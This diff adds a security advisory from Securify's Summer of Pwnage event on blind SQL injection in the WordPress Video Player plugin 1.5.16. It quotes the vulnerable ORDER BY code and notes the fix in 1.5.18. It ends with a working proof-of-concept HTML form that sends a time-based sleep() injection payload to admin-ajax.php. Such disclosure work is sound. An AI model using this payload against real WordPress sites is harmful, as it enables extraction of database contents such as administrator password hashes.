@@ -1,0 +1,116 @@
+<!--
+Multiple SQL injection vulnerabilities in WordPress Video Player
+
+Abstract
+
+It was discovered that WordPress Video Player is affected by multiple blind SQL injection vulnerabilities. Using these issues it is possible for a logged on Contributor (or higher) to extract arbitrary data (eg, the Administrator's password hash) from the WordPress database.
+
+Contact
+
+For feedback or questions about this advisory mail us at sumofpwn at securify.nl
+
+The Summer of Pwnage
+
+This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.
+
+OVE ID
+
+OVE-20160712-0004
+
+Tested versions
+
+This issue was successfully tested on WordPress Video Player WordPress plugin version 1.5.16.
+
+Fix
+
+This issue is resolved in WordPress Video Player 1.5.18.
+
+Introduction
+
+WordPress Video Player is a WordPress video plugin that allows you to easily add videos to your website. WordPress Video Player is affected by multiple blind SQL injection vulnerabilities. Using these issues it is possible for a logged on Contributor (or higher) to extract arbitrary data (eg, the Administrator's password hash) from the WordPress database.
+
+Details
+
+The vulnerabilities exist in the functions show_tag(), spider_video_select_playlist(), and spider_video_select_video(). The author tried to prevent SQL injection by calling the esc_sql() WordPress function. However, the user input is used in the ORDER BY clause and is consequently not quoted. Due to this it is possible to inject arbitrary SQL statements despite the use of esc_sql()
+
+show_tag():
+
+[...]
+   
+if (isset($_POST['page_number'])) {
+   if ($_POST['asc_or_desc']) {
+      $sort["sortid_by"] = esc_sql(esc_html(stripslashes($_POST['order_by'])));
+      if ($_POST['asc_or_desc'] == 1) {
+         $sort["custom_style"] = "manage-column column-title sorted asc";
+         $sort["1_or_2"] = "2";
+         $order = "ORDER BY " . $sort["sortid_by"] . " ASC";
+      } else {
+         $sort["custom_style"] = "manage-column column-title sorted desc";
+         $sort["1_or_2"] = "1";
+         $order = "ORDER BY " . $sort["sortid_by"] . " DESC";
+      }
+   }
+
+
+spider_video_select_playlist():
+[...]
+if(isset($_POST['page_number']))
+{
+   if($_POST['asc_or_desc'])
+   {
+      $sort["sortid_by"]=esc_sql(esc_html(stripslashes($_POST['order_by'])));
+      if($_POST['asc_or_desc']==1)
+      {
+         $sort["custom_style"]="manage-column column-title sorted asc";
+         $sort["1_or_2"]="2";
+         $order="ORDER BY ".$sort["sortid_by"]." ASC";
+      }
+      else
+      {
+         $sort["custom_style"]="manage-column column-title sorted desc";
+         $sort["1_or_2"]="1";
+         $order="ORDER BY ".$sort["sortid_by"]." DESC";
+      }
+   }
+function spider_video_select_video():
+
+[...]
+   
+if(isset($_POST['page_number']))
+{
+      if($_POST['asc_or_desc'])
+      {
+         $sort["sortid_by"]=esc_html(stripslashes($_POST['order_by']));
+         if($_POST['asc_or_desc']==1)
+         {
+            $sort["custom_style"]="manage-column column-title sorted asc";
+            $sort["1_or_2"]="2";
+            $order="ORDER BY ".esc_sql($sort["sortid_by"])." ASC";
+         }
+         else
+         {
+            $sort["custom_style"]="manage-column column-title sorted desc";
+            $sort["1_or_2"]="1";
+            $order="ORDER BY ".esc_sql($sort["sortid_by"])." DESC";
+         }
+      }
+Proof of concept
+-->
+
+<html>
+   <body>
+      <form action="http://<target>/wp-admin/admin-ajax.php?action=spiderVeideoPlayerselectplaylist" method="POST">
+         <input type="hidden" name="search_events_by_title" value="" />
+         <input type="hidden" name="page_number" value="0" />
+         <input type="hidden" name="serch_or_not" value="" />
+         <input type="hidden" name="asc_or_desc" value="1" />
+         <input type="hidden" name="order_by" value="(CASE WHEN (SELECT sleep(10)) = 1 THEN id ELSE title END) ASC #" />
+         <input type="hidden" name="option" value="com_Spider_Video_Player" />
+         <input type="hidden" name="task" value="select_playlist" />
+         <input type="hidden" name="boxchecked" value="0" />
+         <input type="hidden" name="filter_order_playlist" value="" />
+         <input type="hidden" name="filter_order_Dir_playlist" value="" />
+         <input type="submit" value="Submit request" />
+      </form>
+   </body>
+</html>
